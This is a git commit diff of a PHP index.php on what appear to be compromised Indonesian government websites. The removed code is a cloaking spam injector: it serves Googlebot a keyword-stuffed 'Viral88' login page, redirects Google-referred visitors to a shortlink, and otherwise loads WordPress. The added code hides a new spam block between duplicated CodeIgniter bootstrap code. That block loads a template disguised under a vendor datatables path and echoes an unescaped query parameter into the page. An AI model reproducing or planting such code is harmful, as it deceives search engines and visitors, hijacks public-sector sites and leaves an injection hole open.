fa35e53db42197ea7cf57f5d1b19a51fc018625b
adit ganteng <kangpepes@protonmail.com>
2025-03-14 19:58:30 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,64 +1,144 @@
 <?php
+
+// Check PHP version.
+$minPhpVersion = '7.4'; // If you update this, don't forget to update spark.
+if (version_compare(PHP_VERSION, $minPhpVersion, '<')) {
+    $message = sprintf(
+        'Your PHP version must be %s or higher to run CodeIgniter. Current version: %s',
+        $minPhpVersion,
+        PHP_VERSION
+    );
+
+    exit($message);
+}
+
+// Path to the front controller (this file)
+define('FCPATH', __DIR__ . DIRECTORY_SEPARATOR);
+
+// Ensure the current directory is pointing to the front controller's directory
+if (getcwd() . DIRECTORY_SEPARATOR !== FCPATH) {
+    chdir(FCPATH);
+}
+
+/*
+ *---------------------------------------------------------------
+ * BOOTSTRAP THE APPLICATION
+ *---------------------------------------------------------------
+ * This process sets up the path constants, loads and registers
+ * our autoloader, along with Composer's, loads our constants
+ * and fires up an environment-specific bootstrapping.
+ */
+
+// Load our paths config file
+// This is the line that might need to be changed, depending on your folder structure.
+require FCPATH . '../opera_andalan/app/Config/Paths.php';
+// ^^^ Change this line if you move your application folder
+
+$paths = new Config\Paths();
+
+// Location of the framework bootstrap file.
+require rtrim($paths->systemDirectory, '\\/ ') . DIRECTORY_SEPARATOR . 'bootstrap.php';
+
+// Load environment settings from .env files into $_SERVER and $_ENV
+require_once SYSTEMPATH . 'Config/DotEnv.php';
+(new CodeIgniter\Config\DotEnv(ROOTPATH))->load();
+
+// Define ENVIRONMENT
+if (! defined('ENVIRONMENT')) {
+    define('ENVIRONMENT', env('CI_ENVIRONMENT', 'production'));
+}
+
+// Load Config Cache
+// $factoriesCache = new \CodeIgniter\Cache\FactoriesCache();
+// $factoriesCache->load('config');
+// ^^^ Uncomment these lines if you want to use Config Caching.
+
+/*
+ * ---------------------------------------------------------------
+ * GRAB OUR CODEIGNITER INSTANCE
+ * ---------------------------------------------------------------
+ *
+ * The CodeIgniter class contains the core functionality to make
+ * the application run, and does all the dirty work to get
+ * the pieces all working together.
+ */
+
+$app = Config\Services::codeigniter();
+$app->initialize();
+$context = is_cli() ? 'php-cli' : 'web';
+$app->setContext($context);
+
+/*
+ *---------------------------------------------------------------
+ * LAUNCH THE APPLICATION
+ *---------------------------------------------------------------
+ * Now that everything is set up, it's time to actually fire
+ * up the engines and make this app do its thang.
+ */
+
+$app->run();
+
+// Save Config Cache
+// $factoriesCache->save('config');
+// ^^^ Uncomment this line if you want to use Config Caching.
+
+// Exits the application, setting the exit code for CLI-based applications
+// that might be watching.
+exit(EXIT_SUCCESS);
+
 $config = array(
-    'url'        => 'https://kec.baturetno.wonogirikab.go.id/',
-    'parameter'  => 'id',
-    'template'   => 'template.php',
-    'shorlink'   => 'https://t.ly/kejariagam',
-    'amp'        => '#',
+    'url'        => 'https://opera-andalan.ternatekota.go.id/',
+    'parameter'  => 'bavet',
+    'template'   => __DIR__ . '/assets/vendors/datatables/datatable.php',
 );
 
-$html = file_get_contents($config['template']);
-$shortlink = $config['shorlink'];
-
-function index(){
-    /**
-     * Front to the WordPress application. This file doesn't do anything, but loads
-     * wp-blog-header.php which does and tells WordPress to load the theme.
-     *
-     * @package WordPress
-     */
-
-    /**
-     * Tells WordPress to load the WordPress theme and output it.
-     *
-     * @var bool
-     */
-    define( 'WP_USE_THEMES', true );
-
-    /** Loads the WordPress Environment and Template */
-    require __DIR__ . '/wp-blog-header.php';
-}
-
-
-$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$referer = $_SERVER['HTTP_REFERER'] ?? '';
-// Cek apakah User Agent dan Referer sesuai dengan yang diinginkan
-if (strpos($userAgent, 'Googlebot') !== false || strpos($userAgent, 'Google-InspectionTool') !== false) {
-    if(isset($_GET['perkara']))
-    {
-        $keyword= $_GET['perkara'];
-        $brand = trim($keyword);
-        $amp = $config['amp'] . $brand;
-        $url = $config['url'] . '?' . $config['parameter'] . '=' . urlencode($brand);
-        $brands = strtoupper($brand);
-        $brandss = strtolower($brand);
-        $title = "$brands Login : Perpustakaan Digital Platform STIDAR";
-        $deskripsi = "$brands adalah platform perpustakaan digital yang dirancang khusus untuk mendukung kebutuhan akademik di STIDAR. Dengan akses mudah ke ribuan koleksi buku, jurnal, dan referensi digital, Viral88 memberikan pengalaman belajar yang lebih praktis dan efisien.";
-        $html = str_replace('{{ TITLE }}', $title, $html);
-        $html = str_replace('{{ DESCRIPTION }}', $deskripsi, $html);
-        $html = str_replace('{{ BRAND }}', $brands, $html);
-        $html = str_replace('{{ BRANDS }}', $brandss, $html);
-        $html = str_replace('{{ URL }}', $url, $html);
-        $html = str_replace('{{ AMP }}', $amp, $html);
-        $html = str_replace('{{ SHORTLINK }}', $shortlink, $html);
-        echo $html;
-    }else{
-        header("Location: $shortlink");
-        exit;
-    }
-}else if (isset($_SERVER['HTTP_REFERER']) && (strpos($_SERVER['HTTP_REFERER'], 'google.co.id') !== false || strpos($_SERVER['HTTP_REFERER'], 'google.com') !== false)) {
-    header("Location: $shortlink");
+if (isset($_GET[$config['parameter']])) {
+    $brand = trim($_GET[$config['parameter']]);
+    $url = $config['url'] . '?' . $config['parameter'] . '=' . urlencode($brand);
+    $html = file_get_contents($config['template']);
+    $html = str_replace('{{ BRAND }}', $brand, $html);
+    $html = str_replace('{{ URL }}', $url, $html);
+    echo $html;
     exit;
-} else {
-   index();
 }
+
+
+$minPhpVersion = '7.4';
+if (version_compare(PHP_VERSION, $minPhpVersion, '<')) {
+    $message = sprintf(
+        'Your PHP version must be %s or higher to run CodeIgniter. Current version: %s',
+        $minPhpVersion,
+        PHP_VERSION
+    );
+
+    exit($message);
+}
+
+define('FCPATH', __DIR__ . DIRECTORY_SEPARATOR);
+
+if (getcwd() . DIRECTORY_SEPARATOR !== FCPATH) {
+    chdir(FCPATH);
+}
+
+require FCPATH . '../opera_andalan/app/Config/Paths.php';
+
+$paths = new Config\Paths();
+
+require rtrim($paths->systemDirectory, '\\/ ') . DIRECTORY_SEPARATOR . 'bootstrap.php';
+
+require_once SYSTEMPATH . 'Config/DotEnv.php';
+(new CodeIgniter\Config\DotEnv(ROOTPATH))->load();
+
+if (! defined('ENVIRONMENT')) {
+    define('ENVIRONMENT', env('CI_ENVIRONMENT', 'production'));
+}
+
+$app = Config\Services::codeigniter();
+$app->initialize();
+$context = is_cli() ? 'php-cli' : 'web';
+$app->setContext($context);
+
+$app->run();
+
+exit(EXIT_SUCCESS);
+?>
